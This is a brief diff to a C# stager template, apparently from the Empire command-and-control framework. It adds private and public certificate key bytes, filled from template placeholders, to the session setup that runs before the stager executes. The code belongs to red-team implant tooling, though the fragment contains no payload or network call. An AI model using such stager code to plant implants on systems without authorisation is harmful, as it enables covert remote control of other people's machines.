@@ -32,6 +32,8 @@
               string agentlanguage = "dotnet";
               string defaultResponse = "{{ REPLACE_DEFAULTRESPONSE}}";
               string[] arguments = { address, stagingkey, agentlanguage};
+              byte[] skbytes = new byte[] { {{ agent_private_cert_key }} };
+              byte[] pk = new byte[] { {{ agent_public_cert_key }} };
 
               SessionInfo sessionInfo = new SessionInfo(arguments);
               sessionInfo.SetWorkingHours(workinghours);
@@ -41,6 +43,8 @@
               sessionInfo.SetDefaultLostLimit(lostlimit);
               sessionInfo.SetDefaultResponse(defaultResponse);
               sessionInfo.SetProfile(profile);
+              sessionInfo.SetPrivateKeyBytes(skbytes);
+              sessionInfo.SetPublicKeyBytes(pk);
 
               (new EmpireStager(sessionInfo)).Execute();
             }
